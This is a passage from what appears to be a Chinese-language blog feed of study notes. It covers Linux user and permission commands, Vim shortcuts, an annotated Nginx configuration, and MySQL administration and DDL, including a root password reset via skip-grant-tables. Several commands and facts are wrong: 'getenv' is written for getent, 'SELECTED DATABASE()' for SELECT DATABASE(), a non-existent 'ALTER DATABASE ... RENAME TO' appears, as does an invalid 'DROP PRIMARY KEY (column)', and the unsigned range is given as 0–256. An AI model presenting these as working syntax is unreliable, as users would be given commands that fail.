alt="image-20221027222157276"></p></li><li><p>参数，被修改的文件、文件夹</p></li><li><p>选项-R，设置文件夹和其内部全部内容一样生效</p></li></ul><h2 id="chown命令"><a href="#chown命令" class="headerlink" title="chown命令"></a>chown命令</h2><p>修改文件、文件夹所属用户、组</p><p>语法：<code>chown [-R] [用户][:][用户组] 文件或文件夹</code></p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027222326.png" alt="image-20221027222326192"></p><h2 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h2><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027222354.png" alt="image-20221027222354498"></p><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027222407.png" alt="image-20221027222407618"></p><h2 id="genenv命令"><a href="#genenv命令" class="headerlink" title="genenv命令"></a>genenv命令</h2><ul><li><p><code>getenv group</code>，查看系统全部的用户组</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027222446.png" alt="image-20221027222446514"></p></li><li><p><code>getenv passwd</code>，查看系统全部的用户</p><p><img src="https://image-set.oss-cn-zhangjiakou.aliyuncs.com/img-out/2022/10/27/20221027222512.png" alt="image-20221027222512274"></p></li></ul><h2 id="env命令"><a href="#env命令" class="headerlink" title="env命令"></a>env命令</h2><p>查看系统全部的环境变量</p><p>语法：<code>env</code></p><h1 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h1><p>常用的几个命令，需要使用 <code>Esc</code> <strong>切换到命令模式</strong></p><ul><li><p><strong>i</strong> – 切换到输入模式，在<strong>光标当前位置开始输入文本</strong>。</p></li><li><p><strong>a</strong> – 进入插入模式，在<strong>光标下一个位置开始输入文本</strong>。</p></li><li><p><strong>o</strong>：在当前行的<strong>下方插入</strong>一个新行，并进入插入模式。</p></li><li><p><strong>O</strong> – 在当前行的<strong>上方插入</strong>一个新行，并进入插入模式。</p></li><li><p><strong>x</strong> – 删除当前光标所在处的字符。</p></li><li><p><strong>dd</strong> – <strong>删除当前行</strong>。</p></li><li><p><strong>yy</strong> – <strong>复制当前行</strong>。</p></li><li><p><strong>p</strong>（小写） – 粘贴剪贴板内容到光标下方。</p></li><li><p><strong>P</strong>（大写）– 粘贴剪贴板内容到光标上方。</p></li><li><p><strong>u</strong> – <strong>撤销上一次操作</strong>。</p></li><li><p><strong>Ctrl + r</strong> – <strong>重做上一次撤销</strong>的操作。</p></li><li><p><strong>:</strong> – 切换到<strong>底线命令模式</strong>，以在最底一行输入命令。</p></li><li><p><strong>:w</strong> – <strong>保存文件</strong>。</p></li><li><p><strong>:q</strong> – <strong>退出 Vim 编辑器</strong>。</p></li><li><p><strong>:q!</strong> – <strong>强制退出Vim 编辑器，不保存修改</strong>。</p></li></ul><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4c216db0f02f4e1fb1e216edac94a292~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=774&h=523&s=63514&e=png&b=eeeeec" alt="image.png"></p><h1 id="Nginx实践"><a href="#Nginx实践" class="headerlink" title="Nginx实践"></a>Nginx实践</h1><p><a href="https://www.runoob.com/linux/nginx-install-setup.html">安装</a></p><h3 id="虚拟机启动nginx-之后，本机无法访问"><a href="#虚拟机启动nginx-之后，本机无法访问" class="headerlink" title="虚拟机启动nginx 之后，本机无法访问"></a>虚拟机启动nginx 之后，本机无法访问</h3><p>方法1：关闭防火墙</p><p>方法2：开发访问端口，80端口</p><ul><li>firewall-cmd –list-all 查看开放的端口，初始情况下 services和port 是空的</li><li>firewall-cmd –add-service&#x3D;http –permanent</li><li>firewall-cmd –add-port&#x3D;80&#x2F;tcp–permanent</li><li>firewall-cmd –reload 重启防火墙</li></ul><p>简单配置结构</p><ul><li>1、<strong>全局块</strong>：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。</li><li>2、<strong>events块</strong>：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。</li><li>3、<strong>http块</strong>：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。</li><li>4、<strong>server块</strong>：配置虚拟主机的相关参数，一个http中可以有多个server。</li><li>5、<strong>location块</strong>：配置请求的路由，以及各种页面的处理情况。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...              #全局块</span><br><span class="line">events &#123;         #events块</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br><span class="line">http      #http块</span><br><span class="line">&#123;</span><br><span class="line">    ...   #http全局块</span><br><span class="line">    server&#123;</span><br><span class="line">        ...  #server全局块</span><br><span class="line">        location [PATTERN] &#123;  #location块</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server&#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...     #http全局块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">########### 每个指令必须有分号结束。#################</span></span><br><span class="line"><span class="comment">#user administrator administrators;  #配置用户或者组，默认为nobody nobody。</span></span><br><span class="line"><span class="comment">#worker_processes 2;  #允许生成的进程数，默认为1</span></span><br><span class="line"><span class="comment">#pid /nginx/pid/nginx.pid;   #指定nginx进程运行文件存放地址</span></span><br><span class="line">error_log log/error.log debug;  <span class="comment">#制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg</span></span><br><span class="line">events &#123;</span><br><span class="line">    accept_mutex on;   <span class="comment">#设置网路连接序列化，防止惊群现象发生，默认为on</span></span><br><span class="line">    multi_accept on;  <span class="comment">#设置一个进程是否同时接受多个网络连接，默认为off</span></span><br><span class="line">    <span class="comment">#use epoll;      #事件驱动模型，select|poll|kqueue|epoll|resig|/dev/poll|eventport</span></span><br><span class="line">    worker_connections  <span class="number">1024</span>;    <span class="comment">#最大连接数，默认为512</span></span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    <span class="keyword">include</span>       mime.types;   <span class="comment">#文件扩展名与文件类型映射表</span></span><br><span class="line">    default_type  application/octet-stream; <span class="comment">#默认文件类型，默认为text/plain</span></span><br><span class="line">    <span class="comment">#access_log off; #取消服务日志    </span></span><br><span class="line">    log_format myFormat <span class="string">&#x27;$remote_addr–$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for&#x27;</span>; <span class="comment">#自定义格式</span></span><br><span class="line">    access_log log/access.log myFormat;  <span class="comment">#combined为日志格式的默认值</span></span><br><span class="line">    sendfile on;   <span class="comment">#允许sendfile方式传输文件，默认为off，可以在http块，server块，location块。</span></span><br><span class="line">    sendfile_max_chunk <span class="number">100</span>k;  <span class="comment">#每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。</span></span><br><span class="line">    keepalive_timeout <span class="number">65</span>;  <span class="comment">#连接超时时间，默认为75s，可以在http，server，location块。</span></span><br><span class="line"></span><br><span class="line">    upstream mysvr &#123;   </span><br><span class="line">      server <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7878</span>;</span><br><span class="line">      server <span class="number">192.168</span>.<span class="number">10.121</span>:<span class="number">3333</span> backup;  <span class="comment">#热备</span></span><br><span class="line">    &#125;</span><br><span class="line">    error_page <span class="number">404</span> https:<span class="comment">//www.baidu.com; #错误页</span></span><br><span class="line">    server &#123;</span><br><span class="line">        keepalive_requests <span class="number">120</span>; <span class="comment">#单连接请求上限次数。</span></span><br><span class="line">        listen       <span class="number">4545</span>;   <span class="comment">#监听端口</span></span><br><span class="line">        server_name  <span class="number">127.0</span>.<span class="number">0.1</span>;   <span class="comment">#监听地址       </span></span><br><span class="line">        location  ~*^.+$ &#123;       <span class="comment">#请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。</span></span><br><span class="line">           <span class="comment">#root path;  #根目录</span></span><br><span class="line">           <span class="comment">#index vv.txt;  #设置默认页</span></span><br><span class="line">           proxy_pass  http:<span class="comment">//mysvr;  #请求转向mysvr 定义的服务器列表</span></span><br><span class="line">           deny <span class="number">127.0</span>.<span class="number">0.1</span>;  <span class="comment">#拒绝的ip</span></span><br><span class="line">           allow <span class="number">172.18</span>.<span class="number">5.54</span>; <span class="comment">#允许的ip           </span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、几个常见配置项：</p><ul><li>1.$remote_addr 与 $http_x_forwarded_for 用以记录客户端的ip地址；</li><li>2.$remote_user ：用来记录客户端用户名称；</li><li>3.$time_local ： 用来记录访问时间与时区；</li><li>4.$request ： 用来记录请求的url与http协议；</li><li>5.$status ： 用来记录请求状态；成功是200；</li><li>6.$body_bytes_s ent ：记录发送给客户端文件主体内容大小；</li><li>7.$http_referer ：用来记录从那个页面链接访问过来的；</li><li>8.$http_user_agent ：记录客户端浏览器的相关信息；</li></ul><p>2、惊群现象：一个网路连接到来，多个睡眠的进程被同时叫醒，但只有一个进程能获得链接，这样会影响系统性能。</p><p>3、每个指令必须有分号结束。</p>]]></content>
    
    
    <summary type="html">Linux基础命令介绍</summary>
    
    
    
    <category term="服务端" scheme="https://hisai3.github.io/hisai3.github.io/categories/%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
    
    
    <category term="Linux" scheme="https://hisai3.github.io/hisai3.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>MySQL</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/12/18/MySQL/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/12/18/MySQL/</id>
    <published>2023-12-18T02:31:31.000Z</published>
    <updated>2023-12-18T02:12:16.116Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MySQL-服务器"><a href="#MySQL-服务器" class="headerlink" title="MySQL 服务器"></a>MySQL 服务器</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd c:/mysql/bin</span><br><span class="line">mysqld --console</span><br></pre></td></tr></table></figure><h3 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd c:/mysql/bin</span><br><span class="line">mysqladmin -uroot shutdown</span><br></pre></td></tr></table></figure><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysql -u root -p   </span><br><span class="line">Enter password:******  # 登录后进入终端</span><br></pre></td></tr></table></figure><h3 id="密码错误"><a href="#密码错误" class="headerlink" title="密码错误"></a><strong>密码错误</strong></h3><p><code>ERROR 1045 (28000): Access denied for user ‘root’@‘localhost’ (using password: YES)</code></p><p><strong>修改密码</strong> (<strong>管理员权限运行命令窗口</strong>)  <a href="https://blog.csdn.net/m0_46576135/article/details/123883397">参考</a></p><p>1.关闭mysql服务 (窗口一)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop mysql</span><br></pre></td></tr></table></figure><p>2.跳过Mysql密码验证  (另起窗口二执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld -console --skip-grant-tables --shared-memory</span><br></pre></td></tr></table></figure><p>3.无密码方式进入Mysql  (另起窗口三执行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p (此时会显示让你输入密码，直接回车，就可以成功连接Mysql)</span><br></pre></td></tr></table></figure><p>4.将登陆密码设置为空 （窗口三上执行）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql; (使用mysql数据表)</span><br><span class="line">update user set authentication_string=&#x27;&#x27; where user=&#x27;root&#x27;;（将密码置为空）</span><br><span class="line">quit; (然后退出Mysql)</span><br></pre></td></tr></table></figure><p>5.更改自己的登陆密码（关闭窗口一和窗口二）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p (直接回车登录)</span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;root&#x27;;（更改密码）</span><br><span class="line">quit(退出mysql, 重新登上验证新密码)</span><br></pre></td></tr></table></figure><h3 id="服务启动失败"><a href="#服务启动失败" class="headerlink" title="服务启动失败"></a>服务启动失败</h3><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/62e505e2ec3e4daead85ce499b01b231~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1040&h=723&s=168099&e=png&b=f9f9f9" alt="image.png"></p><p>1.首先进入到MySQL的安装目录下，每个人的安装目录可能会有所不同，比如 C:\Program Files\MySQL\MySQL Server 8.0</p><p>2.看一下与bin同级的目录中有没有data这个文件夹，若有，则把原有的data文件夹删掉或者剪切到别的地方，如果有重要的数据请另外保存好；</p><p>若没有data文件夹则自己新建一个空的。</p><p>3.然后用管理员身份打开命令行窗口，进入bin目录，执行一下初始化 mysqld –initialize，再次net start MySQL就解决了</p><h2 id="库-databases"><a href="#库-databases" class="headerlink" title="库 databases"></a>库 databases</h2><h3 id="增-CREATE"><a href="#增-CREATE" class="headerlink" title="增 CREATE"></a>增 CREATE</h3><p>1.简单创建数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure><p>2.创建时添加选项，判断<strong>是否已存在（重复会报错）</strong>，设置<strong>字符集，排序规则</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE [IF NOT EXISTS] database_name</span><br><span class="line">  [CHARACTER SET charset_name]</span><br><span class="line">  [COLLATE collation_name];</span><br></pre></td></tr></table></figure><h3 id="删-DROP"><a href="#删-DROP" class="headerlink" title="删 DROP"></a>删 DROP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE 数据库名;        -- 直接删除数据库，不检查是否存在</span><br><span class="line">或</span><br><span class="line">DROP DATABASE [IF EXISTS] 数据库名;</span><br></pre></td></tr></table></figure><h3 id="改-ALTER-DATABASE"><a href="#改-ALTER-DATABASE" class="headerlink" title="改 ALTER DATABASE"></a>改 ALTER DATABASE</h3><p>1.重命名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE mydatabase RENAME TO new_name;</span><br></pre></td></tr></table></figure><p>2.修改字符集，排序规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE mydatabase CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;</span><br></pre></td></tr></table></figure><h3 id="查-SHOW-x2F-SELECTED"><a href="#查-SHOW-x2F-SELECTED" class="headerlink" title="查 SHOW &#x2F; SELECTED"></a>查 SHOW &#x2F; SELECTED</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES; -- 当前存在的数据库</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECTED DATABASE(); -- 当前所在数据库</span><br></pre></td></tr></table></figure><h3 id="选择-USE"><a href="#选择-USE" class="headerlink" title="选择 USE"></a>选择 USE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE database_name;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u your_username -p -D database_name;</span><br></pre></td></tr></table></figure><h2 id="表-table"><a href="#表-table" class="headerlink" title="表 table"></a>表 table</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><strong>1) 数值类型</strong></p><p>整数类型包括 TINYINT、SMALLINT、MEDIUMINT、INT、BIGINT，浮点数类型包括 FLOAT 和 DOUBLE，定点数类型为 DECIMAL。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3d99860f6cfb4291ba06a1ca8b07ef30~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=835&h=650&s=65512&e=png&b=faf8f7" alt="image.png"></p><p><strong>2) 日期&#x2F;时间类型</strong></p><p>包括 YEAR、TIME、DATE、DATETIME 和 TIMESTAMP。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ff2272beea7f46aeaff2582ca0cbedfe~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=836&h=369&s=37093&e=png&b=fbf9f9" alt="image.png"></p><p><strong>3) 字符串类型</strong></p><p>包括 CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM 和 SET 等。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/31f4801c2bbe4a77ac001b30699ad59c~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=840&h=488&s=43273&e=png&b=faf8f7" alt="image.png"></p><p><strong>4) 二进制类型</strong></p><p>包括 BIT、BINARY、VARBINARY、TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。</p><h3 id="约束-constraint"><a href="#约束-constraint" class="headerlink" title="约束 constraint"></a>约束 constraint</h3><p>表在设计的时候加入约束的目的就是为了保证表中的记录完整性和有效性，比如用户表有些列的值（手机号）不能为空，有些列的值（身份证号）不能重复。</p><p><strong>1、主键约束(<code>primary key</code>) PK</strong></p><p>相当于 <strong>唯一约束 + 非空约束</strong> 的组合，当创建主键的约束时，系统默认会在所在的列和列组合上建立对应的唯一索引。</p><p><strong>2、自增长约束(<code>auto_increment</code>)</strong> </p><p>初始值是 <strong>1</strong>，每新增一条记录，字段值<strong>自动加 1</strong>，修改初始值 <strong>auto_increment&#x3D;100</strong> ，数据类型必须是 <strong>NOT NULL</strong> 且 <strong>整数类型</strong>（<code>TINYINT、SMALLINT、INT、BIGINT</code>），最大值受该字段的数据类型约束，如果达到<strong>上限则失效</strong>。</p><p><strong>3、非空约束(<code>not null</code>)</strong></p><p><strong>4、唯一性约束(<code>unique</code>)</strong> ，是指所有记录中字段的值不能重复出现。</p><p><strong>5、默认约束(<code>default</code>)</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table t_user10 ( </span><br><span class="line">  ...</span><br><span class="line">  address varchar(20) default ‘北京’ -- 指定默认约束 </span><br><span class="line">);</span><br><span class="line">alter table &lt;表名&gt; modify column &lt;字段名&gt; &lt;类型&gt; default null; </span><br></pre></td></tr></table></figure><p><strong>6、零填充约束(<code>zerofill</code>)</strong></p><p>插入数据时，当该字段的值的长度小于定义的长度时，会在该值的前面补上相应的0，默认为int(10)；</p><p>默认会自动加unsigned（无符号）属性，使用unsigned属性后，数值范围是原值的2倍，例如，有符号为-128<del>+127，无符号为0</del>256。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table t_user12 ( </span><br><span class="line">  id int zerofill , -- 零填充约束</span><br><span class="line">  name varchar(20)   </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">alter table t_user12 modify id int;</span><br></pre></td></tr></table></figure><p><strong>7、外键约束(<code>foreign key</code>) FK</strong></p><h3 id="增-CREATE-1"><a href="#增-CREATE-1" class="headerlink" title="增 CREATE"></a>增 CREATE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名 (</span><br><span class="line">    列名 数据类型 默认值 AUTO_INCREMENT,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">)[表的选项设置 存储引擎，字符集，排序规则...];</span><br><span class="line">-- 常见的数据类型包括 INT, VARCHAR, DATE, BOOLEAN</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users (</span><br><span class="line">    id INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">    username VARCHAR(50) NOT NULL,</span><br><span class="line">    email VARCHAR(100) NOT NULL,</span><br><span class="line">    birthdate DATE,</span><br><span class="line">    is_active BOOLEAN DEFAULT TRUE</span><br><span class="line">) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;</span><br><span class="line"></span><br><span class="line">-- id: 用户 id，整数类型，自增长，作为主键。</span><br><span class="line">-- username: 用户名，变长字符串，不允许为空。</span><br><span class="line">-- email: 用户邮箱，变长字符串，不允许为空。</span><br><span class="line">-- birthdate: 用户的生日，日期类型。</span><br><span class="line">-- is_active: 用户是否已经激活，布尔类型，默认值为 true。</span><br></pre></td></tr></table></figure><p>主键设置 <strong>PRIMARY KEY</strong></p><p><strong>AUTO_INCREMENT</strong> 自增需要确定类型</p><p>1.单列 <strong>PRIMARY KEY</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users (</span><br><span class="line">    id INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>2.多列 <strong>PRIMARY KEY()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `runoob_tbl`(</span><br><span class="line">   `runoob_id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   ...</span><br><span class="line">   PRIMARY KEY ( `runoob_id`, `runoob_name`, ... )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="删-DROP-1"><a href="#删-DROP-1" class="headerlink" title="删 DROP"></a>删 DROP</h3><p>跟删除库一样，关键字不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE 表名 ;    -- 直接删除表，不检查是否存在</span><br><span class="line">或</span><br><span class="line">DROP TABLE [IF EXISTS] 表名;</span><br></pre></td></tr></table></figure><h3 id="改-ALTER-TABLE"><a href="#改-ALTER-TABLE" class="headerlink" title="改 ALTER TABLE"></a>改 ALTER TABLE</h3><p>修改表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 旧表名 RENAME TO 新表名;</span><br></pre></td></tr></table></figure><h3 id="查-SHOW"><a href="#查-SHOW" class="headerlink" title="查 SHOW"></a>查 SHOW</h3><p>1.查当前存在的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES;</span><br></pre></td></tr></table></figure><p>2.查表创建的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE TABLE 表名;</span><br></pre></td></tr></table></figure><h2 id="列"><a href="#列" class="headerlink" title="列"></a>列</h2><h3 id="增-ALTER-TABLE-…-ADD-COLUMN"><a href="#增-ALTER-TABLE-…-ADD-COLUMN" class="headerlink" title="增 ALTER TABLE … ADD COLUMN"></a>增 ALTER TABLE … ADD COLUMN</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名</span><br><span class="line">ADD COLUMN 新的列名 数据类型;</span><br><span class="line"></span><br><span class="line">-- 批量添加</span><br><span class="line">ALTER TABLE 表名</span><br><span class="line">ADD COLUMN 新的列名1 数据类型，</span><br><span class="line">ADD COLUMN 新的列名2 数据类型;</span><br></pre></td></tr></table></figure><h3 id="删-ALTER-TABLE-…-DROP-COLUMN"><a href="#删-ALTER-TABLE-…-DROP-COLUMN" class="headerlink" title="删 ALTER TABLE … DROP COLUMN"></a>删 ALTER TABLE … DROP COLUMN</h3><p>会将表对应列的数据一同删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 DROP COLUMN 列名;</span><br></pre></td></tr></table></figure><h3 id="改-ALTER-TABLE-…-MODIFY-x2F-CHANGE-COLUMN"><a href="#改-ALTER-TABLE-…-MODIFY-x2F-CHANGE-COLUMN" class="headerlink" title="改 ALTER TABLE … MODIFY &#x2F; CHANGE COLUMN"></a>改 ALTER TABLE … MODIFY &#x2F; CHANGE COLUMN</h3><p><strong>MODIFY COLUMN</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 MODIFY COLUMN 列名 数据类型;</span><br></pre></td></tr></table></figure><p><strong>CHANGE COLUMN</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 CHANGE COLUMN 旧的列名 新的列名 数据类型;</span><br></pre></td></tr></table></figure><p>修改默认值 <strong>SET DEFAULT</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 ALTER 列名 SET DEFAULT 1000;</span><br></pre></td></tr></table></figure><p>添加或删除 <strong>ADD&#x2F;DROP PRIMARY KEY</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 MODIFY COLUMN 列名 VARCHAR(50) PRIMARY KEY;</span><br><span class="line">ALTER TABLE 表名 ADD PRIMARY KEY (列名);</span><br><span class="line"></span><br><span class="line">ALTER TABLE 表名 DROP PRIMARY KEY (列名);</span><br><span class="line"></span><br><span class="line">-- 主键字段会被标记为“PRI”</span><br></pre></td></tr></table></figure><p>添加会删除 